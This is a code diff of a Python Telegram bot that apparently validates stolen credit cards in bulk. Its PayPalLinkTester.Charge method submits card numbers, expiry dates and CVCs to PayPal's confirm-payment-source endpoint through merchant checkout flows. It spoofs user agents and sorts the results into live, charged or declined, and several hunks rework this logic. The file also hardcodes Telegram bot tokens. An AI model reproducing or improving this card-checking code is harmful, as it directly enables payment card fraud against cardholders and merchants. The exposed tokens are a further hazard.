@@ -19,7 +19,7 @@ from telegram.ext import (
 )
 from datetime import datetime
 
-TOKEN = '8031233073:AAGgdXbO9TCxPYdPiedLlT9zGVxIMQFiML4'
+TOKEN = '7327856614:AAG9fY6rjp_wPKTLNnQCgoZdzagla3h9-80'
 
 ADMINS = [6843321125]
 VIP_USERS = {}
@@ -128,98 +128,6 @@ class PayPalLinkTester:
         if urlparse(target_url).query:
             self.inurl += f"?{urlparse(target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
-
-    def Charge(self, ccx):
-        try:
-            # Initialize and extract data
-            self._init_and_extract()
-            self._try_all_token_methods()
-            
-            parts = ccx.strip().split("|")
-            if len(parts) < 4:
-                return "Invalid card format"
-            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-            if "20" in yy:
-                yy = yy.split("20")[1]
-            
-            try:
-                exp_year = int(f"20{yy}")
-                exp_month = int(mm)
-                now = datetime.now()
-                if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
-                    return "EXPIRED_CARD"
-            except:
-                pass
-            
-            expiry = f"20{yy}-{mm}"
-            order_id = self._create_order()
-            
-            if not order_id:
-                return "Create Order Failed"
-            
-            auth_tokens = []
-            if self.client_token:
-                auth_tokens.append(self.client_token)
-            if self.access_token:
-                auth_tokens.append(self.access_token)
-            if self.client_id:
-                auth_tokens.append(self.client_id)
-            
-            confirm_json = {}
-            for auth_token in auth_tokens:
-                he4 = {
-                    'authorization': f'Bearer {auth_token}',
-                    'paypal-client-metadata-id': self.client_id or '',
-                    'user-agent': self.uu.random,
-                    'paypal-request-id': str(uuid.uuid4()),
-                }
-                da3 = {
-                    'payment_source': {
-                        'card': {
-                            'number': n,
-                            'expiry': expiry,
-                            'security_code': cvc,
-                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
-                        }
-                    },
-                    'application_context': {'vault': False},
-                }
-                try:
-                    confirm_res = self.r.post(
-                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
-                        headers=he4,
-                        json=da3,
-                        timeout=15
-                    )
-                    if confirm_res.status_code == 200:
-                        try:
-                            confirm_json = confirm_res.json()
-                        except:
-                            confirm_json = {}
-                        break
-                except:
-                    continue
-            
-            # Check confirm_json for errors
-            if isinstance(confirm_json, dict):
-                confirm_str = str(confirm_json).upper()
-                if 'INSUFFICIENT_FUNDS' in confirm_str:
-                    return "INSUFFICIENT_FUNDS"
-                if 'RESTRICTED_OR_INACTIVE_ACCOUNT' in confirm_str:
-                    return "RESTRICTED_OR_INACTIVE_ACCOUNT"
-                if 'PAYEE_BLOCKED_TRANSACTION' in confirm_str:
-                    return "PAYEE_BLOCKED_TRANSACTION"
-                if 'SUSPECTED_FRAUD' in confirm_str:
-                    return "SUSPECTED_FRAUD"
-                if 'EXPIRED_CARD' in confirm_str:
-                    return "EXPIRED_CARD"
-            
-            approve_res = self._approve_order(order_id)
-            text = approve_res.text if approve_res else ''
-            
-            return self._clean_response(text)
-        except Exception as e:
-            return f"Error: {e}"
 
     def _init_and_extract(self):
         try:
@@ -431,36 +339,87 @@ class PayPalLinkTester:
 
     def _clean_response(self, text):
         if not text:
-            return "DECLINED"
+            return "No Response"
         
         text_upper = text.upper()
         text_lower = text.lower()
         
         if '<!DOCTYPE' in text_upper or '<html' in text_upper:
-            return "DECLINED"
+            return "HTML Response"
         
         if 'true' in text_lower or 'charge 1' in text_lower or 'charge $' in text_lower or 'charged' in text_lower or 'completed' in text_lower or 'approved' in text_lower or 'success' in text_lower:
             if 'error' not in text_lower and 'expecting' not in text_lower and 'invalid' not in text_lower:
                 return "CHARGE 1.0"
         
+        try:
+            json_data = json.loads(text)
+            if isinstance(json_data, dict):
+                if 'data' in json_data and isinstance(json_data['data'], dict):
+                    if 'error' in json_data['data']:
+                        return str(json_data['data']['error'])
+                if 'error' in json_data:
+                    if isinstance(json_data['error'], str):
+                        return json_data['error']
+                    elif isinstance(json_data['error'], dict):
+                        if 'message' in json_data['error']:
+                            return json_data['error']['message']
+                        if 'name' in json_data['error']:
+                            return json_data['error']['name']
+                if 'name' in json_data:
+                    return json_data['name']
+                if 'message' in json_data:
+                    return str(json_data['message'])
+                if 'details' in json_data and isinstance(json_data['details'], list) and len(json_data['details']) > 0:
+                    detail = json_data['details'][0]
+                    if isinstance(detail, dict):
+                        issue = detail.get('issue', '')
+                        description = detail.get('description', '')
+                        if issue:
+                            return f"{issue}: {description}" if description else issue
+        except:
+            pass
+        
         if 'insufficient' in text_lower:
             return "INSUFFICIENT_FUNDS"
-        
         if 'order_not_approved' in text_lower:
             return "Payer cannot pay for this transaction."
-            
         if 'expired_card' in text_lower or 'expired_credit_card' in text_lower:
             return "EXPIRED_CARD"
-        elif 'payee_blocked_transaction' in text_lower:
+        if 'payee_blocked_transaction' in text_lower:
             return "PAYEE_BLOCKED_TRANSACTION"
-        elif 'suspected_fraud' in text_lower:
+        if 'suspected_fraud' in text_lower:
             return "SUSPECTED_FRAUD"
-        elif 'restricted_or_inactive_account' in text_lower:
+        if 'restricted_or_inactive_account' in text_lower:
             return "RESTRICTED_OR_INACTIVE_ACCOUNT"
-        elif 'declined' in text_lower or 'error' in text_lower or 'expecting' in text_lower or 'invalid' in text_lower or 'failed' in text_lower:
-            return "DECLINED"
+        if 'declined_please_retry' in text_lower:
+            return "DECLINED_PLEASE_RETRY"
+        if 'payer_cannot_pay' in text_lower:
+            return "Payer cannot pay for this transaction."
         
-        return text[:80]
+        error_match = re.search(r'"issue"\s*:\s*"([^"]+)"', text)
+        if error_match:
+            return error_match.group(1)
+        
+        error_match = re.search(r'"name"\s*:\s*"([^"]+)"', text)
+        if error_match:
+            return error_match.group(1)
+        
+        error_match = re.search(r'"message"\s*:\s*"([^"]+)"', text)
+        if error_match:
+            return error_match.group(1)
+        
+        error_match = re.search(r'"error"\s*:\s*"([^"]+)"', text)
+        if error_match:
+            return error_match.group(1)
+        
+        data_error = re.search(r'"data"\s*:\s*\{[^}]*"error"\s*:\s*"([^"]+)"', text)
+        if data_error:
+            return data_error.group(1)
+        
+        if len(text) < 200:
+            return text.strip()
+        
+        return text[:200]
 
     def _create_order(self):
         if self.ajax_url and 'admin-ajax' in self.ajax_url:
@@ -635,6 +594,115 @@ class PayPalLinkTester:
                 continue
         return None
 
+    def Charge(self, ccx):
+        try:
+            self._init_and_extract()
+            self._try_all_token_methods()
+            
+            parts = ccx.strip().split("|")
+            if len(parts) < 4:
+                return "Invalid card format"
+            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+            if "20" in yy:
+                yy = yy.split("20")[1]
+            
+            try:
+                exp_year = int(f"20{yy}")
+                exp_month = int(mm)
+                now = datetime.now()
+                if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
+                    return "EXPIRED_CARD"
+            except:
+                pass
+            
+            expiry = f"20{yy}-{mm}"
+            order_id = self._create_order()
+            
+            if not order_id:
+                return "Create Order Failed"
+            
+            auth_tokens = []
+            if self.client_token:
+                auth_tokens.append(self.client_token)
+            if self.access_token:
+                auth_tokens.append(self.access_token)
+            if self.client_id:
+                auth_tokens.append(self.client_id)
+            
+            confirm_json = {}
+            confirm_text = ""
+            for auth_token in auth_tokens:
+                he4 = {
+                    'authorization': f'Bearer {auth_token}',
+                    'paypal-client-metadata-id': self.client_id or '',
+                    'user-agent': self.uu.random,
+                    'paypal-request-id': str(uuid.uuid4()),
+                }
+                da3 = {
+                    'payment_source': {
+                        'card': {
+                            'number': n,
+                            'expiry': expiry,
+                            'security_code': cvc,
+                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
+                        }
+                    },
+                    'application_context': {'vault': False},
+                }
+                try:
+                    confirm_res = self.r.post(
+                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
+                        headers=he4,
+                        json=da3,
+                        timeout=15
+                    )
+                    confirm_text = confirm_res.text
+                    if confirm_res.status_code == 200:
+                        try:
+                            confirm_json = confirm_res.json()
+                        except:
+                            confirm_json = {}
+                        break
+                    else:
+                        clean = self._clean_response(confirm_res.text)
+                        if clean and clean != "DECLINED" and clean != "No Response":
+                            return clean
+                except:
+                    continue
+            
+            if isinstance(confirm_json, dict) and len(confirm_json) > 0:
+                confirm_str = str(confirm_json).upper()
+                if 'INSUFFICIENT_FUNDS' in confirm_str:
+                    return "INSUFFICIENT_FUNDS"
+                if 'RESTRICTED_OR_INACTIVE_ACCOUNT' in confirm_str:
+                    return "RESTRICTED_OR_INACTIVE_ACCOUNT"
+                if 'PAYEE_BLOCKED_TRANSACTION' in confirm_str:
+                    return "PAYEE_BLOCKED_TRANSACTION"
+                if 'SUSPECTED_FRAUD' in confirm_str:
+                    return "SUSPECTED_FRAUD"
+                if 'EXPIRED_CARD' in confirm_str:
+                    return "EXPIRED_CARD"
+                clean = self._clean_response(str(confirm_json))
+                if clean and clean != "DECLINED":
+                    return clean
+            
+            if confirm_text:
+                clean = self._clean_response(confirm_text)
+                if clean and clean != "DECLINED" and clean != "No Response":
+                    return clean
+            
+            approve_res = self._approve_order(order_id)
+            text = approve_res.text if approve_res else ''
+            
+            if text:
+                clean = self._clean_response(text)
+                if clean:
+                    return clean
+            
+            return "No Response"
+        except Exception as e:
+            return f"Error: {e}"
+
 # ===================== END NEW PAYPAL CLASS =====================
 
 async def check_card_api(card_full, gateway_url):
@@ -652,7 +720,7 @@ async def check_card_api(card_full, gateway_url):
             elif "insufficient" in result:
                 return "live", result_raw
             else:
-                return "declined", result_raw if result_raw else "Declined"
+                return "declined", result_raw if result_raw else "No Response"
         except Exception as e:
             return "declined", f"Error: {e}"
 
@@ -1541,7 +1609,6 @@ async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     del pending_files[user_id]
 
 async def process_paypal_file(file_path, chat_id, context):
-    global gateway_index
     user_id = chat_id
     stop_users[user_id] = False
     try:
